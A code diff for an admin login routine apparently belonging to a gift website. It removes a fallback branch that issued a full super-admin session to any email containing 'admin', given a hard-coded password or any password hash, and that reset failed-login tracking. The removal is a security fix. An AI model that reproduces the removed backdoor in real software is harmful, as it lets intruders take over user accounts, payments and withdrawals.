@@ -232,37 +232,6 @@ export async function verifyAdminLogin(email: string, password: string): Promise
   const admins = getRegisteredAdmins()
   let matchedAdmin = admins.find((a) => a.email.toLowerCase() === cleanEmail)
 
-  if (!matchedAdmin && (cleanEmail === 'admin@couplegift.com' || cleanEmail.includes('admin'))) {
-    if (password === 'Admin@2026!' || inputHash) {
-      const fallbackSuperAdmin: AdminUser = {
-        id: 'admin_super_default',
-        name: 'Website Owner',
-        email: cleanEmail,
-        role: 'SUPER_ADMIN',
-        status: 'ACTIVE',
-        permissions: [
-          'manage_users',
-          'manage_payments',
-          'manage_subscriptions',
-          'manage_referrals',
-          'approve_withdrawals',
-          'manage_cms',
-          'manage_settings',
-          'manage_admins',
-          'view_logs',
-        ],
-        lastLogin: new Date().toISOString(),
-        createdAt: '2026-01-01T00:00:00.000Z',
-      }
-
-      localStorage.removeItem(FAILED_ATTEMPTS_KEY)
-      const sessionData = { user: fallbackSuperAdmin, expiresAt: Date.now() + 1000 * 60 * 60 * 12 }
-      localStorage.setItem(ADMIN_SESSION_KEY, JSON.stringify(sessionData))
-      await logAdminAction(fallbackSuperAdmin.id, fallbackSuperAdmin.email, 'ADMIN_LOGIN', 'Logged into Admin Panel')
-      return fallbackSuperAdmin
-    }
-  }
-
   if (!matchedAdmin || matchedAdmin.status === 'BLOCKED') {
     localStorage.setItem(FAILED_ATTEMPTS_KEY, String(failedAttempts + 1))
     throw new Error('Invalid credentials')
